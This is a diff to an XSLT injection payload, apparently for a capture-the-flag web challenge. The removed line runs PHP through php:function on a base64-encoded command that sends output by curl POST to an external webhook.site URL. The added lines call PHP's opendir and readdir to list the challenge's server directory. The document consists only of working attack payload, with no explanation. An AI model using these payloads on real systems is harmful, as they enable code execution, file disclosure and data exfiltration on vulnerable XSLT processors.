@@ -3,7 +3,8 @@
   xmlns:java="http://xml.apache.org/xalan/java">
 
   <xsl:template match="s">
-<xsl:value-of select="php:function(&quot;base64_decode('ZWNobyBjb3Vjb3UgfCBjdXJsIC1YIFBPU1QgLUYgInJlc3VsdD1ALSIgaHR0cHM6Ly93ZWJob29rLnNpdGUvMDMxMWU2MTAtNWZmOS00MzA2LTkyZWQtODU3YjNkNjBjZjUx')&quot;)"/>
+<xsl:value-of select="php:function('opendir','/challenge/web-serveur/ch50/')"/>
+<xsl:value-of select="php:function('readdir')"/>
   </xsl:template>
 
 </xsl:stylesheet>
